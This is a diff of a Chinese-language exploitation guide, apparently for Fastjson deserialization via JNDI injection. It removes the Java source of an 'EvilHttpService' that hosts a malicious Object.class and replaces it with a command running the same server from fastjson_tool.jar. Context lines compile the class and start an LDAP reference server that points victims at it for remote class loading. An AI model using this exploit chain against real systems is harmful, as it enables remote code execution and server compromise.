@@ -56,29 +56,7 @@ public class Object {
 javac Object.java
 
 启动http服务器
-import java.io.*;
-import java.net.*;
-import com.sun.net.httpserver.*;
-
-public class EvilHttpService {
-    public static void main(String[] args) {
-        try {
-            String serverAddress = args[0];
-            int localport = Integer.parseInt(args[1]);
-            System.out.println("Starting HTTP server");
-            HttpServer httpServer = HttpServer.create(new InetSocketAddress(localport), 0);
-            httpServer.createContext("/",new HttpFileHandler());
-            httpServer.setExecutor(null);
-            httpServer.start();
-            System.out.println("\nEvilobject: http://"+serverAddress+":"+localport+"/Object.class");
-
-        } catch(Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-
-java EvilHttpService ip port
+java -cp fastjson_tool.jar EvilHttpService 127.0.0.1 80
 
 启动ldap服务，从http服务获取class
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
